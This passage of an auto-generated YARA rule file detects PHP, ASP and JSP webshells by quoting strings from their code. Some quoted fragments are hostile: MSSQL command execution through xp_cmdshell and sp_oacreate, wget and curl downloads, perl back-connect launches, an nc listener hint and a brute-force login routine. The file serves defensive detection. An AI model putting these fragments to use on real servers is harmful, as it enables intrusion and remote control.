      $s5 = "@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /C \"&REQUEST(\"CMD\")&\" > 8617.TMP',0,TRUE;BULK INSERT [JNC] FROM '8617.TMP' WITH (" ascii
      $s6 = "       STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD." ascii
      $s7 = "       STRQUERY = \"CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);USE MASTER DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL'" ascii
      $s8 = "       STRQUERY = \"DROP TABLE [JNC];DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD " ascii
      $s9 = "                       STRQUERY=\"DBCC ADDEXTENDEDPROC ('XP_CMDSHELL','XPLOG70.DLL')\"" fullword ascii
      $s10 = " EXEC SP_ADD_JOBSTEP NULL,'X',NULL,'1','CMDEXEC','CMD /C \"&REQUEST.FORM(\"CMD\")&\"' EXEC SP_ADD_JOBSERVER NULL,'X',@@SERVERNAM" ascii
      $s11 = "       CMD=CHR(34)&\"CMD.EXE /C \"&REQUEST.FORM(\"CMD\")&\" > 8617.TMP\"&CHR(34)" fullword ascii
      $s12 = "                       STRQUERY = \"EXEC MASTER.DBO.XP_SERVICECONTROL 'START','SQLSERVERAGENT';\"" fullword ascii
      $s13 = "Response.AddHeader \"Content-Length\", OSM.Size" fullword ascii
      $s14 = "       ADOCONN.EXECUTE(STRQUERY)" fullword ascii
      $s15 = "       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)" fullword ascii
      $s16 = "----</OPTION><OPTION VALUE=XP_CMDSHELL>XP_CMDSHELL</OPTION><OPTION VALUE=SP_OACREATE>SP_OACREATE</OPTION><OPTION VALUE=XP_REGWRI" ascii
      $s17 = "                       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) " fullword ascii
      $s18 = "       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) " fullword ascii
      $s19 = "                       ADOCONN.EXECUTE(STRQUERY)" fullword ascii
      $s20 = "                       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _c99v2_c99shell_ctt_sh_Shell__ci___Biz_was_here_c99_56 {
   meta:
      description = "webshell - from files c99v2.php, c99shell.php, ctt_sh.php, Shell [ci] .Biz was here.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash2 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash3 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
      hash4 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash5 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "if (!function_exists(\"mysql_dump\"))" fullword ascii
      $s2 = "\"download\"=>" fullword ascii
      $s3 = "\"forward\"=>" fullword ascii
      $s4 = "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao\"." fullword ascii
      $s5 = "\"krqAsLfJ7YQBl4tiRCYFSpPMdRRCoQOiL4i8CgZgk09WfWLBYZHB6UWjCequwEDHuOEVK3QtgN/j\"." fullword ascii
      $s6 = "\"AkUnGTkRNwMS34MBJBgdRkJLCD7qggEPKxsJKiYTBweJkjhQkk7AhxQ9FqgLMGBGkG8KFCg8JKAi\"." fullword ascii
      $s7 = "\"pVxqhlxqiExkimKBtMPL2Ftvj2OV6aOuwpqlulyN3cnO1wAAXQAAZSM8jE5XjgAAbwAAeURBYgAA\"." fullword ascii
      $s8 = "\"wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA\"." fullword ascii
      $s9 = "\"ext_log\"=>" fullword ascii
      $s10 = "\"sql_button_drop\"=>" fullword ascii
      $s11 = "\"sql_button_insert\"=>" fullword ascii
      $s12 = "\"Xv/9qfbptP/uZ93GiNq6XWpRJ//iQv7wsquEQv/jRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"." fullword ascii
      $s13 = "\"/52nuqjK5/n///j///7///r//0trlsPn/8nn/8nZ5trm79nu/8/q/9Xt/9zw/93w/+j1/9Hr/+Dv\"." fullword ascii
      $s14 = "\"ABAALAAAAAAUABQAAAWVICSKikKWaDmuShCUbjzMwEoGhVvsfHEENRYOgegljkeg0PF4KBIFRMIB\"." fullword ascii
      $s15 = "\"IXtdgwgdPGdYfng1IVeJaTIAkpOUlZYfHxEAOw==\"," fullword ascii
      $s16 = "\"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7\"." fullword ascii
      $s17 = "\"dmrYAMn1onq/YKpjvEgAADs=\"," fullword ascii
      $s18 = "\"RYtMAgEAOw==\"," fullword ascii
      $s19 = "\"R0lGODlhFAAUALMAAAAAAP///93d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAAAAAAAAAAAAAA\"." fullword ascii
      $s20 = "\"R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp\"." fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _webshell_nc_400_57 {
   meta:
      description = "webshell - from files webshell-nc.jsp, 400.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
      hash2 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
   strings:
      $s1 = "Hashtable ht = parser.processData(request.getInputStream()," fullword ascii
      $s2 = "public Hashtable processData(ServletInputStream is, String boundary," fullword ascii
      $s3 = "sbFile.append(\"\" + list[i].getName());" fullword ascii
      $s4 = "if (ht.get(\"cqqUploadFile\") != null) {" fullword ascii
      $s5 = "sbCmd.append(line + \"\\r\\n\");" fullword ascii
      $s6 = "String strContent = request.getParameter(\"content\");" fullword ascii
      $s7 = "if (!f1.renameTo(new File(path + f1.getName()))) {" fullword ascii
      $s8 = "new InputStreamReader(p.getInputStream()));" fullword ascii
      $s9 = "if (time - 60l >= 0) {" fullword ascii
      $s10 = "public String getFileName(String dir, String fileName)" fullword ascii
      $s11 = "line = line.substring(0, index - 1);" fullword ascii
      $s12 = "private synchronized String getLine(ServletInputStream sis)" fullword ascii
      $s13 = "sbNewFile.append(strF + \" " fullword ascii
      $s14 = "\" + strTmpFile + \"<p>\");" fullword ascii
      $s15 = "sbCopy.append(\"<input type=hidden name=file value='\" + strFile" fullword ascii
      $s16 = "currentLine.length)) == -1) {" fullword ascii
      $s17 = "sbCopy.append(\"<input type=hidden name=path value='\" + strDir" fullword ascii
      $s18 = "bound, tempdir, clength);" fullword ascii
      $s19 = "sbFile.append(\"\" + strLen);" fullword ascii
      $s20 = "previousLine.length)) == -1) {" fullword ascii
   condition:
      ( ( uint16(0) == 0x3c0a or uint16(0) == 0x253c ) and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _elmaliseker_zehir_58 {
   meta:
      description = "webshell - from files elmaliseker.asp, zehir.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "aba1440e6fa797116ec2d0f0dda9278eae32ee2155ee0c5ae41dc4e02337bfbd"
      hash2 = "c350b163b5527ee445b315ec5a2431e311201616ce8cb2f7d048888ef58da2c4"
   strings:
      $s1 = "targetPath=objUpload.Fields(\"folder\").Value" fullword ascii
      $s2 = "llngEnd = InStrB(llngStart + 1, mbinData, mstrDelimiter) - 2" fullword ascii
      $s3 = "llngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Type:\"), vbTextCompare)" fullword ascii
      $s4 = "Public Property Get Count()" fullword ascii
      $s5 = "llngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Disposition:\"), vbTextCompare)" fullword ascii
      $s6 = "path=addslash(targetPath) & name" fullword ascii
      $s7 = "For llngIndex = 0 To mlngCount - 1" fullword ascii
      $s8 = "ParseContentType = Trim(CStrU(MidB(pbinChunk, llngStart, llngLength)))" fullword ascii
      $s9 = "Call Err.Raise(vbObjectError + 1, \"clsUpload.asp\", \"Object does not exist within the ordinal reference.\")" fullword ascii
      $s10 = "lstrContentType = ParseContentType(pbinChunk)" fullword ascii
      $s11 = "If llngIndex > mlngCount - 1 Or llngIndex < 0 Then" fullword ascii
      $s12 = "Public Default Property Get Fields(ByVal pstrName)" fullword ascii
      $s13 = "lbinBuffer = lobjRs.Fields(\"BinaryData\").GetChunk(llngLength)" fullword ascii
      $s14 = "llngLength = llngEnd - llngStart" fullword ascii
      $s15 = "Private Function ParseContentType(ByRef pbinChunk)" fullword ascii
      $s16 = "FileDir = Mid(pstrPath, 1, InStrRev(pstrPath, \"\\\") - 1)" fullword ascii
      $s17 = "Public Property Get BLOB()" fullword ascii
      $s18 = "Public Property Get FilePath()" fullword ascii
      $s19 = "Private Sub AddField(ByRef pstrName, ByRef pstrFileName, ByRef pstrContentType, ByRef pstrValue, ByRef pbinData)" fullword ascii
      $s20 = "lobjField.ContentType = pstrContentType" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _nstview_NIX_REMOTE_WEB_SHELL_59 {
   meta:
      description = "webshell - from files nstview.php, NIX REMOTE WEB-SHELL.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a111977d2403dd241ef2fabe841b96535f05d004a276e12ad29462b565b8aaa8"
      hash2 = "6ee85fade63001a1129d3fd66223066647377a49cfeec4e92b075988fe937b2f"
   strings:
      $s1 = "if(@$_POST['massupload']){" fullword ascii
      $s2 = "print \"<script>alert('$path $hmm');</script>\";" fullword ascii
      $s3 = "$editf=@$_POST['editf'];" fullword ascii
      $s4 = "if (@move_uploaded_file(@$_FILES['text20']['tmp_name'], $uploadfile20)) {" fullword ascii
      $s5 = "$groupinfo = posix_getgrgid($group);" fullword ascii
      $s6 = "if(@$_GET['edit']==\"1\"){" fullword ascii
      $s7 = "@$base64=$_POST['base64'];" fullword ascii
      $s8 = "$whereme=getcwd();" fullword ascii
      $s9 = "if (@move_uploaded_file(@$_FILES['text4']['tmp_name'], $uploadfile4)) {" fullword ascii
      $s10 = "if (@move_uploaded_file(@$_FILES['text15']['tmp_name'], $uploadfile15)) {" fullword ascii
      $s11 = "if (@move_uploaded_file(@$_FILES['text16']['tmp_name'], $uploadfile16)) {" fullword ascii
      $s12 = "if (@move_uploaded_file(@$_FILES['text19']['tmp_name'], $uploadfile19)) {" fullword ascii
      $s13 = "@$des=@$_POST['des'];" fullword ascii
      $s14 = "if (@move_uploaded_file(@$_FILES['text5']['tmp_name'], $uploadfile5)) {" fullword ascii
      $s15 = "if (@move_uploaded_file(@$_FILES['text13']['tmp_name'], $uploadfile13)) {" fullword ascii
      $s16 = "$delete=$_GET['delete'];" fullword ascii
      $s17 = "if (@move_uploaded_file(@$_FILES['text11']['tmp_name'], $uploadfile11)) {" fullword ascii
      $s18 = "if (@move_uploaded_file(@$_FILES['text14']['tmp_name'], $uploadfile14)) {" fullword ascii
      $s19 = "$rback=$_GET['rback'];" fullword ascii
      $s20 = "if (@move_uploaded_file(@$_FILES['text18']['tmp_name'], $uploadfile18)) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _m_he1p_1_nogfw_JspSpy1_luci_jsp_spy2009_a_JspSpyJDK5_JspSpyJDK51_u_css_807_jspspy_k8_jspspy_ma3_ok_style_cofigrue_dm_xia_x7_60 {
   meta:
      description = "webshell - from files m.jsp, he1p.jsp, 1.jsp, nogfw.jsp, JspSpy1.jsp, luci.jsp.spy2009.jsp, a.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, u.jsp, css.jsp, 807.jsp, jspspy_k8.jsp, jspspy.jsp, ma3.jsp, ok.jsp, style.jsp, cofigrue.jsp, dm.jsp, xia.jsp, x7.jsp, mmym520.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
      hash2 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
      hash3 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
      hash4 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
      hash5 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
      hash6 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
      hash7 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
      hash8 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
      hash9 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
      hash10 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
      hash11 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
      hash12 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
      hash13 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
      hash14 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
      hash15 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
      hash16 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
      hash17 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
      hash18 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
      hash19 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
      hash20 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
      hash21 = "30e33036efcafcca023954308dfb75b7b3a48c4b9d3cdf776943f6479f559235"
      hash22 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
   strings:
      $x1 = "if (program == null) program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt\";" fullword ascii
      $x2 = "if (cmd == null) cmd = \"cmd.exe /c set\";" fullword ascii
      $s3 = "<input type=\\\"text\\\" name=\\\"exe\\\" style=\\\"width:300px\\\" class=\\\"input\\\" value=\\\"c:\\\\windows\\\\system32\\\\c" ascii
      $s4 = "ins.get(\"vLogin\").invoke(request,response,session);" fullword ascii
      $s5 = "ins.get(\"login\").invoke(request,response,session);" fullword ascii
      $s6 = "ins.get(\"script\").invoke(request,response,session);" fullword ascii
      $s7 = "ins.get(\"vPortScan\").invoke(request,response,JSession);" fullword ascii
      $s8 = "response.sendRedirect(SHELL_NAME+\"?o=vLogin\");" fullword ascii
      $s9 = "<a href=\\\"javascript:doPost({o:'vRemoteControl'});\\\">Remote Control</a> | \"+" fullword ascii
      $s10 = "ins.get(\"bottom\").invoke(request,response,session);" fullword ascii
      $s11 = "ins.get(\"dbc\").invoke(request,response,JSession);" fullword ascii
      $s12 = "\"  <td><a href=\\\"javascript:new fso({}).packBatch();\\\">Pack Selected</a> - <a href=\\\"javascript:new fso({}).deleteBatch()" ascii
      $s13 = "\"  <td><a href=\\\"javascript:new fso({}).packBatch();\\\">Pack Selected</a> - <a href=\\\"javascript:new fso({}).deleteBatch()" ascii
      $s14 = "ins.get(\"vmp\").invoke(request,response,JSession);" fullword ascii
      $s15 = "ins.get(\"top\").invoke(request,response,session);" fullword ascii
      $s16 = "ins.get(\"vd\").invoke(request,response,JSession);" fullword ascii
      $s17 = "out.println(\"<a href=\\\"javascript:new fso({path:'\"+Util.convertPath(r.getPath())+\"'}).subdir();\\\">Disk(\"+Util.convertPat" ascii
      $s18 = "ins.get(\"after\").invoke(request,response,session);" fullword ascii
      $s19 = "ins.get(\"before\").invoke(request,response,session);" fullword ascii
      $s20 = "ins.get(\"filelist\").invoke(request,response,JSession);" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _zehir4_zehir_61 {
   meta:
      description = "webshell - from files zehir4.asp, zehir.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
      hash2 = "c350b163b5527ee445b315ec5a2431e311201616ce8cb2f7d048888ef58da2c4"
   strings:
      $s1 = "Response.Write \"<form method=get target='_opener' action='\"&DosyPath&\"'>\"" fullword ascii
      $s2 = "CASE 9 'SQL Execute" fullword ascii
      $s3 = " olabilir')</script>\":Response.End" fullword ascii
      $s4 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time=\"&time&\"'>!</a></font> - <a href='\"&dosyapath" ascii
      $s5 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time=\"&time&\"'>!</a></font> - <a href='\"&dosyapath" ascii
      $s6 = "<form name=frmUpload method=post enctype=\"multipart/form-data\" action=\"<%=DosyaPath&\"?status=-4&Time=\"&time&\"&Path=\"&path" ascii
      $s7 = "<form name=frmUpload method=post enctype=\"multipart/form-data\" action=\"<%=DosyaPath&\"?status=-4&Time=\"&time&\"&Path=\"&path" ascii
      $s8 = "Response.End%>" fullword ascii
      $s9 = "sterseniz Download Ederek g" fullword ascii
      $s10 = "tu : [\"&err.Description&\"]</td></tr>\"" fullword ascii
      $s11 = "Set objFSO = CreateObject (\"Scripting.FileSystemObject\")" fullword ascii
      $s12 = "    Response.AddHeader \"Content-Length\", Fil.Size" fullword ascii
      $s13 = "    Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & Fil.name" fullword ascii
      $s14 = "ilemler" fullword ascii
      $s15 = "</a></font> * <a href='\"&dosyapath&\"?status=7&path=\"&f1.path&\"&Time=\"&time&\"'>\"&f1.path&\" [\"&f1.size&\"]\"&\"</a></b><b" ascii
      $s16 = "Response.Write \"<table align=center border=1 width=150 cellpadding=0 cellspacing=0><tr bgcolor=gray><td align=center><b><font c" ascii
      $s17 = "Response.Write \"</a></td></tr>\"" fullword ascii
      $s18 = "                                  <option selected>-- Boyut --</option>" fullword ascii
      $s19 = "sub WriteTestOnDriver" fullword ascii
      $s20 = "Response.Write \"<table align=center border=1 width=150 cellpadding=0 cellspacing=0><tr bgcolor=gray><td align=center><b><font c" ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _angel_2008_2009lite_spy_2011_2013_2009mssql_62 {
   meta:
      description = "webshell - from files angel.php, 2008.php, 2009lite.php, spy.php, 2011.php, 2013.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash3 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash4 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash5 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash6 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
      hash7 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "function execute($cfe) {" fullword ascii
      $s2 = "22 => array('max_execution_time',getcfg('max_execution_time').' second(s)')," fullword ascii
      $s3 = "echo 'Processed in '.$totaltime.' second(s)';" fullword ascii
      $s4 = "if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}" fullword ascii
      $s5 = "header('Content-Disposition: attachment; filename='.$fileinfo['basename']);" fullword ascii
      $s6 = "if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}" fullword ascii
      $s7 = "$res = @shell_exec($cfe);" fullword ascii
      $s8 = "return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$w" ascii
      $s9 = "orld['write'].$world['execute'];" fullword ascii
      $s10 = "$owner['execute'] = ($mode & 00100) ? 'x' : '-'; " fullword ascii
      $s11 = "$res = @ob_get_contents();" fullword ascii
      $s12 = "} elseif(function_exists('shell_exec')) {" fullword ascii
      $s13 = "if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}" fullword ascii
      $s14 = "3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME']))," fullword ascii
      $s15 = "return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$w" ascii
      $s16 = "$world['execute'] = ($mode & 00001) ? 'x' : '-'; " fullword ascii
      $s17 = "$group['execute'] = ($mode & 00010) ? 'x' : '-'; " fullword ascii
      $s18 = "@exec($cfe,$res);" fullword ascii
      $s19 = "16 => array('display_errors',getcfg('display_errors'))," fullword ascii
      $s20 = "return ' / <a href=\"#\" title=\"User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mysql_interface_v1_0_MySQL_Web_Interface_Version_0_8_63 {
   meta:
      description = "webshell - from files Mysql interface v1.0.php, MySQL Web Interface Version 0.8.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dbc14c68d1e9dfd7f8eb2ac283fc31031154a4e1a69240f180f6b564d1f8350a"
      hash2 = "8548e7070db852e66fcfe2f9aca057847a4a77171a083a715d450bb4149204ef"
   strings:
      $s1 = "$mysqlHandle = mysql_pconnect( $HOSTNAME, $USERNAME, $PASSWORD );" fullword ascii
      $s2 = "header(\"Content-disposition: filename=$filename.sql\");" fullword ascii
      $s3 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword ascii
      $s4 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword ascii
      $s5 = "if( $action == \"dumpTable\" )" fullword ascii
      $s6 = "dump();" fullword ascii
      $s7 = "* -------------------------------" fullword ascii
      $s8 = "global $PHP_SELF, $USERNAME, $PASSWORD, $action, $dbname, $tablename;" fullword ascii
      $s9 = "global $username, $password, $PHP_SELF;" fullword ascii
      $s10 = "if( $command == \"\" || substr( $command, 0, 5 ) == \"flush\" ) {" fullword ascii
      $s11 = "logon_submit();" fullword ascii
      $s12 = "setcookie( \"mysql_web_admin_password\" );" fullword ascii
      $s13 = "function logon() {" fullword ascii
      $s14 = "else if( $action == \"logon_submit\" )" fullword ascii
      $s15 = "if( $action == \"logon\" || $action == \"\" || $action == \"logout\" )" fullword ascii
      $s16 = "echo \"<input type=hidden name=action value=logon_submit>\\n\";" fullword ascii
      $s17 = "function logon_submit() {" fullword ascii
      $s18 = "setcookie( \"mysql_web_admin_password\", $password );" fullword ascii
      $s19 = "global $PHP_SELF, $command;" fullword ascii
      $s20 = "logon();" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso2_5_1_other_decode_wso2_64 {
   meta:
      description = "webshell - from files wso2.5.1.php, other-decode.php, wso2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash2 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash3 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
   strings:
      $s1 = "       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><" ascii
      $s2 = "$explink = 'http://exploit-db.com/search/?action=search&filter_description=';" fullword ascii
      $s3 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
      $s4 = "if( wsoBruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s5 = "echo \"<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s6 = "       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><" ascii
      $s7 = "                wsoSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s8 = "die(\"<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>\"" ascii
      $s9 = "function wsoBruteForce($ip,$port,$login,$pass) {" fullword ascii
      $s10 = "TP_HOST'] . \" - WSO \" . WSO_VERSION .\"</title>" fullword ascii
      $s11 = "    echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(\\'Php\\',n" ascii
      $s12 = "$out = wsoEx(\"perl /tmp/bc.pl \".$_POST['p2'].\" \".$_POST['p3'].\" 1>/dev/null 2>&1 &\");" fullword ascii
      $s13 = "$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes(\"\\n$ \".$_POST['p1'].\"\\n\".wsoEx($_POST['p1']),\"\\n\\r\\t\\\\'\\0\")" ascii
      $s14 = "$out = wsoEx(\"perl /tmp/bp.pl \".$_POST['p2'].\" 1>/dev/null 2>&1 &\");" fullword ascii
      $s15 = "WSOsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', true);" fullword ascii
      $s16 = "WSOsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', 0);" fullword ascii
      $s17 = "<td><form onsubmit=\\\"g('Console',null,this.c.value);return false;\\\"><span>Execute:</span><br><input class='toolsInp' type=te" ascii
      $s18 = "<td><form onsubmit=\\\"g('Console',null,this.c.value);return false;\\\"><span>Execute:</span><br><input class='toolsInp' type=te" ascii
      $s19 = "                foreach ($downloaders as $item)" fullword ascii
      $s20 = "                    wsoSecParam('Users', $temp);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_4_b374k_2_2_b374k_2_3_65 {
   meta:
      description = "webshell - from files b374k-2.4.php, b374k-2.2.php, b374k-2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash2 = "5479f8cd1375364770df36e5a18262480a8f9d311e8eedb2c2390ecb233852ad"
      hash3 = "e6b1fbcc9a2d988ef9e8c36da38f19a802a5886a43736a1466566f97f342f946"
   strings:
      $s1 = "$rspesanb = \"Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button\";" fullword ascii
      $s2 = "// http://www.kryogenix.org/code/browser/sorttable/ - this makes the tables sortable" fullword ascii
      $s3 = "header(\"Content-type: \".$inf[\"mime\"]);" fullword ascii
      $s4 = "header(\"Content-type: image/png\");" fullword ascii
      $s5 = "exe(xwhich('wget').\" \".$u.\" -O \".$p);" fullword ascii
      $s6 = "exe(xwhich('curl').\" \".$u.\" -o \".$p);" fullword ascii
      $s7 = "jB731xywzxrwYKUXkk4xxB2i7ymtQuuBGZCjsojRVwTXcysa/TqUTmSh2HMa91a7YZ0qRNVYLgNwQtwmQrJdsJvUSEBUz/8zQNVQ2o/aoAl3VtpQNpmNMxN5cC22w+LR" ascii
      $s8 = "wjdxmqMCWEmvitekHWI0uGth99RBahPvJQrNvGomUcurSNzkliaAcy6eiApglWoXuZOs/J+CS0xFMxf8Ks6rWAsXd9g2suJf4GzwyhPBPZ9A/BeAFccYv5NoiN+KdvcL" ascii
      $s9 = "mTFPRvZaDpBb9KwClFcOyi1H53oT1j+H0O6qgK4mrSUqgPGpTX+khMZHbuYFTiH4YRxPPk5j4KUDklvJqFjOh//1ME70H8VxZyqkDjFTdZ7cYnzue2d87mZ6Kcy+u42e" ascii
